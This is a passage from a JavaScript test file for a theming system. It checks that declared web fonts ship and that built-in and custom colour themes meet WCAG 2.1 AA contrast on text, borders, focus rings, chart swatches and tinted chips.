      ok(files.has(`${stem}-Variable-ext.woff2`), `${fam} has no latin-ext file`);
    }
  });

  it('ships every declared font file', () => {
    for (const f of files) {
      const p = new URL(`../fonts/${f}`, import.meta.url);
      ok(statSync(p).size > 1000, `fonts/${f} is missing or empty`);
    }
  });

  it('never lets a theme lead with a font we do not ship', () => {
    for (const [id, theme] of Object.entries(THEMES)) {
      for (const token of ['--display', '--body']) {
        const fam = firstFamily(theme.tokens[token]);
        ok(declared.has(fam), `${id} ${token} leads with unshipped "${fam}"`);
      }
    }
  });

  it('never lets a custom-theme headline lead with a font we do not ship', () => {
    for (const [id, font] of Object.entries(CUSTOM_FONTS)) {
      const fam = firstFamily(font.css);
      ok(declared.has(fam), `builder font ${id} leads with unshipped "${fam}"`);
    }
  });
});

// =====================================================================
// Accessibility — WCAG 2.1 AA, asserted rather than audited.
//
// The point of these is that they fail when someone adds a 21st theme,
// nudges an accent, or reaches for a raw palette token where type goes.
// The long-form findings and the reasoning live in docs/accessibility.md;
// `node tools/a11y-contrast.mjs` prints the same checks with ratios.
// =====================================================================

describe('accessibility — theme contrast', () => {
  it('every built-in theme passes AA on every pair we draw', () => {
    for (const id of Object.keys(THEMES)) {
      const bad = auditTheme(getTheme(id));
      ok(bad.length === 0,
        `${id}: ${bad.map((b) => `${b.what} ${b.ratio.toFixed(2)}:1 (need ${b.need})`).join('; ')}`);
    }
  });

  it('derives the tokens every themed surface reads', () => {
    const need = ['--on-accent', '--on-good', '--on-bad', '--edge-strong',
      '--accent-text', '--accent-2-text', '--good-text', '--bad-text'];
    for (const id of Object.keys(THEMES)) {
      const t = getTheme(id).tokens;
      need.forEach((k) => ok(/^#[0-9a-f]{6}$/i.test(t[k] || ''), `${id} ${k}: ${t[k]}`));
    }
  });

  it('never lets a theme state its own failing override', () => {
    // deriveTokens honours an explicit value; auditTheme must still catch it
    const broken = { tokens: { ...THEMES['clean-slate'].tokens, '--on-accent': '#e8f4ff' } };
    ok(auditTheme(broken).some((b) => b.what.includes('Button text')),
      'an authored --on-accent below AA should be reported');
  });

  it('control borders clear 3:1 — they are the only edge an input has', () => {
    for (const id of Object.keys(THEMES)) {
      const t = getTheme(id).tokens;
      for (const bg of ['--surface', '--ground']) {
        const r = contrastRatio(t['--edge-strong'], t[bg]);
        ok(r >= 3, `${id} --edge-strong on ${bg}: ${r.toFixed(2)}:1`);
      }
    }
  });

  it('the focus ring is a solid accent, legible on ground and surface', () => {
    for (const id of Object.keys(THEMES)) {
      const t = getTheme(id).tokens;
      for (const bg of ['--ground', '--surface']) {
        const r = contrastRatio(t['--accent'], t[bg]);
        ok(r >= 3, `${id} focus ring on ${bg}: ${r.toFixed(2)}:1`);
      }
    }
  });

  it('every chart palette swatch clears 3:1 against the page', () => {
    for (const id of Object.keys(THEMES)) {
      const t = getTheme(id).tokens;
      const g = t['--ground'];
      for (const n of [2, 3, 5, 8, 12]) {
        const sets = [
          ['hueWheel', hueWheel(t['--accent'], n, g)],
          ['harmonicSeries', harmonicSeries(t['--accent'], t['--accent-2'], n, g)],
        ];
        for (const [what, colors] of sets) {
          eq(colors.length, n);
          colors.forEach((c, i) => {
            const r = contrastRatio(c, g);
            ok(r >= 3, `${id} ${what} n=${n} #${i + 1} (${c}): ${r.toFixed(2)}:1`);
          });
        }
      }
    }
  });

  it('a custom theme cannot be built below AA unless the picks are hopeless', () => {
    const picks = [
      // ink-soft's 35% walk toward the page lands at 2.9:1 here; the
      // clamp is what pulls it back over the line
      { ground: '#ffffff', ink: '#6b6b6b' },
      { ground: '#101010', ink: '#9a9a9a', accent: '#7cc4ff' },
      // light accents on a dark page: on-accent has to flip to a dark
      // value, the very case a hardcoded #fff got wrong
      { ground: '#1e2a24', ink: '#f2f5ef', accent: '#ffd76e', accent2: '#74b816' },
      // light-mid ground — the case a luminance threshold gets backwards
      { ground: '#b8b8b8', ink: '#000000', accent: '#123a8a', accent2: '#5a1010' },
    ];
    for (const p of picks) {
      const t = buildCustomTheme(p);
      ok(auditTheme(t).length === 0,
        `picks ${JSON.stringify(p)}: ${JSON.stringify(auditTheme(t))}`);
    }
  });

  it('reports the picks it genuinely cannot rescue, so the builder can refuse', () => {
    // These are stated by the instructor, not derived, so nothing can
    // save them without silently rendering a colour they did not pick.
    const hopeless = [
      { ground: '#ffffff', ink: '#ffffff' },              // invisible ink
      { ground: '#ffffff', ink: '#777777' },              // ink itself is 4.48:1
      { ground: '#888888', accent: '#1d4ed8' },           // accent lost in the ground
      // a mid-grey page makes every tint mid-grey too: the accent chip
      // tops out around 4:1 even with pure black type on it
      { ground: '#8a8a8a', ink: '#000000', accent: '#101828', accent2: '#3d1010' },
    ];
    for (const p of hopeless) {
      const bad = auditTheme(buildCustomTheme(p));
      ok(bad.length > 0, `${JSON.stringify(p)} must be reported, not shipped`);
      ok(bad[0].ratio <= bad[bad.length - 1].ratio, 'the worst pair comes first');
    }
  });

  it('picks the pole that actually buys contrast, not the one a threshold guesses', () => {
    // #8a8a8a is below a naive "is it dark?" cutoff of 0.4 luminance but
    // black beats white on it, 5.6:1 to 3.4:1. Deriving toward white here
    // makes the type LESS legible, which is how the bug reads in practice.
    const t = deriveTokens({
      '--ink': '#000000', '--ink-soft': '#222222', '--ground': '#8a8a8a',
      '--surface': '#909090', '--edge': '#6a6a6a', '--accent': '#123a8a',
      '--accent-soft': '#7a7f8f', '--accent-2': '#7a2020',
      '--good': '#1c6b2c', '--bad': '#8a1c1c',
    });
    ok(luminance(t['--accent-2-text']) < luminance('#8a8a8a'),
      `--accent-2-text ${t['--accent-2-text']} went the wrong way on a mid-tone page`);
    ok(contrastRatio(t['--accent-2-text'], '#8a8a8a') >= 4.5,
      `only reached ${contrastRatio(t['--accent-2-text'], '#8a8a8a').toFixed(2)}:1`);
  });

  it('clears AA on the tinted chips, not just on plain surfaces', () => {
    // The gap that let .chip-ended ship under AA on six themes: a chip
    // paints color-mix(TOKEN n%, transparent) behind type of that same
    // colour, so the background is NOT --surface and a surface-only
    // matrix reports clean.
    const TINT = { '--accent': 0.20, '--accent-2': 0.18, '--good': 0.18, '--bad': 0.16, '--ink': 0.10 };
    const pairs = [['--accent-text', '--accent'], ['--accent-2-text', '--accent-2'],
      ['--good-text', '--good'], ['--bad-text', '--bad'], ['--ink-soft', '--ink']];
    const hx = (h) => { const n = parseInt(h.slice(1), 16); return [(n >> 16) & 255, (n >> 8) & 255, n & 255]; };
    const mix = (a, b, t) => `#${hx(a).map((v, i) => Math.round(v * t + hx(b)[i] * (1 - t)).toString(16).padStart(2, '0')).join('')}`;
    for (const id of Object.keys(THEMES)) {
      const t = getTheme(id).tokens;
      for (const [fg, base] of pairs) {
        const bg = mix(t[base], t['--surface'], TINT[base]);
        const r = contrastRatio(t[fg], bg);
        ok(r >= 4.5, `${id} ${fg} on a ${TINT[base] * 100}% ${base} wash (${bg}): ${r.toFixed(2)}:1`);
      }
    }
  });

  it('leaves fills alone — only the -text siblings move', () => {
    // the whole point of the split: a theme stays as loud as it was drawn
    for (const id of Object.keys(THEMES)) {
      const raw = THEMES[id].tokens;
      const t = deriveTokens(raw);
      for (const k of ['--accent', '--accent-2', '--good', '--bad', '--ground', '--ink']) {
        eq(t[k], raw[k], `${id} ${k} must not be rewritten`);
      }
    }
  });
});

console.log('\n');
if (failures.length) {
  console.log('FAILURES\n');
  failures.forEach(({ group: g, name, err }) => {
    console.log(`  ✗ ${g} › ${name}`);
    console.log(`    ${err.message.split('\n').join('\n    ')}\n`);
  });
}
console.log(`${passed} passed, ${failed} failed\n`);
process.exit(failed ? 1 : 0);
